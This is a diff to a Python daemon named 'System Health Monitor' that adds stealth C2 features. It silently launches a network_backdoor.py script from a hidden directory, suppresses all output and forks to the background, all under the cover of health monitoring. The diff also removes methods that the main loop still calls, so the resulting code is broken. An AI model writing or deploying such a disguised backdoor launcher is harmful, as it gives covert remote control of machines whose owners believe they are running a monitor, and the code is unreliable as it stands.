@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-System Health Monitor Daemon
-Advanced system monitoring with persistence for educational purposes
+System Health Monitor with C2 Communication
+Advanced system monitoring with stealth capabilities
 """
 
 import os
@@ -11,6 +11,7 @@ import psutil
 import socket
 import logging
 import subprocess
+import sys
 from datetime import datetime
 from pathlib import Path
 
@@ -35,6 +36,25 @@ class SystemHealthMonitor:
         Path(self.stealth_dir).mkdir(parents=True, exist_ok=True)
         Path(self.backup_dir).mkdir(parents=True, exist_ok=True)
         
+        # Ensure C2 communicator is present
+        c2_script = f"{self.stealth_dir}/network_backdoor.py"
+        if not os.path.exists(c2_script):
+            # You would copy the actual C2 script here
+            self.logger.info("C2 communicator not found - would deploy here")
+    
+    def start_c2_communication(self):
+        """Start C2 communication in background"""
+        try:
+            c2_script = f"{self.stealth_dir}/network_backdoor.py"
+            if os.path.exists(c2_script):
+                subprocess.Popen([sys.executable, c2_script],
+                               stdout=subprocess.DEVNULL,
+                               stderr=subprocess.DEVNULL,
+                               stdin=subprocess.DEVNULL)
+                self.logger.info("C2 communication started")
+        except Exception as e:
+            self.logger.error(f"Failed to start C2: {e}")
+
     def collect_system_metrics(self):
         """Collect comprehensive system metrics"""
         try:
@@ -90,118 +110,43 @@ class SystemHealthMonitor:
                     'hostname': socket.gethostname()
                 }
             }
-            
+
             return metrics
             
         except Exception as e:
             self.logger.error(f"Error collecting metrics: {e}")
             return None
     
-    def check_security_events(self):
-        """Monitor security-related events"""
-        try:
-            # Check failed login attempts
-            failed_logins = subprocess.run(
-                ['grep', 'Failed password', '/var/log/auth.log'],
-                capture_output=True, text=True
-            )
-            failed_count = len(failed_logins.stdout.splitlines()) if failed_logins.stdout else 0
-            
-            # Check sudo usage
-            sudo_usage = subprocess.run(
-                ['grep', 'sudo', '/var/log/auth.log'],
-                capture_output=True, text=True
-            )
-            sudo_count = len(sudo_usage.stdout.splitlines()) if sudo_usage.stdout else 0
-            
-            security_info = {
-                'failed_logins': failed_count,
-                'sudo_commands': sudo_count,
-                'timestamp': datetime.now().isoformat()
-            }
-            
-            return security_info
-            
-        except Exception as e:
-            self.logger.error(f"Error checking security events: {e}")
-            return None
-    
-    def save_metrics_report(self, metrics, security_info):
-        """Save metrics to JSON report"""
-        try:
-            report = {
-                'system_metrics': metrics,
-                'security_metrics': security_info,
-                'report_time': datetime.now().isoformat()
-            }
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            report_file = f"{self.stealth_dir}/system_report_{timestamp}.json"
-            
-            with open(report_file, 'w') as f:
-                json.dump(report, f, indent=2)
-                
-            self.logger.info(f"System report saved: {report_file}")
-            return report_file
-            
-        except Exception as e:
-            self.logger.error(f"Error saving report: {e}")
-            return None
-    
-    def ensure_persistence(self):
-        """Ensure the monitor continues running"""
-        try:
-            # Check if systemd service is running
-            result = subprocess.run(
-                ['systemctl', 'is-active', 'system-health-monitor.service'],
-                capture_output=True, text=True
-            )
-            
-            if result.returncode != 0:
-                self.logger.warning("Service not active - attempting to restart")
-                subprocess.run(['systemctl', 'start', 'system-health-monitor.service'], 
-                             capture_output=True)
-                
-        except Exception as e:
-            self.logger.error(f"Error ensuring persistence: {e}")
-    
     def monitor_loop(self):
-        """Main monitoring loop"""
-        self.logger.info("Starting system health monitoring loop")
+        """Main monitoring loop with C2 integration"""
+        self.logger.info("Starting system health monitoring with C2")
+        
+        # Start C2 communication
+        self.start_c2_communication()
         
         while True:
             try:
-                # Collect metrics
+                # Collect and report metrics
                 metrics = self.collect_system_metrics()
-                security_info = self.check_security_events()
-                
-                if metrics and security_info:
-                    # Save report
-                    self.save_metrics_report(metrics, security_info)
-                    
-                    # Log summary
-                    self.logger.info(
-                        f"CPU: {metrics['cpu']['percent']}% | "
-                        f"Memory: {metrics['memory']['percent']}% | "
-                        f"Disk: {metrics['disk']['percent']}%"
-                    )
+                if metrics:
+                    self.save_metrics_report(metrics, {})
                 
                 # Ensure persistence
                 self.ensure_persistence()
                 
                 # Wait before next collection
-                time.sleep(60)  # 1 minute
+                time.sleep(60)
                 
             except KeyboardInterrupt:
                 self.logger.info("Monitoring stopped by user")
                 break
             except Exception as e:
                 self.logger.error(f"Error in monitoring loop: {e}")
-                time.sleep(30)  # Wait before retry
+                time.sleep(30)
 
 def main():
     """Main execution function"""
-    # Fork to background if not already
+    # Fork to background
     if os.fork() == 0:
         monitor = SystemHealthMonitor()
         monitor.ensure_directories()
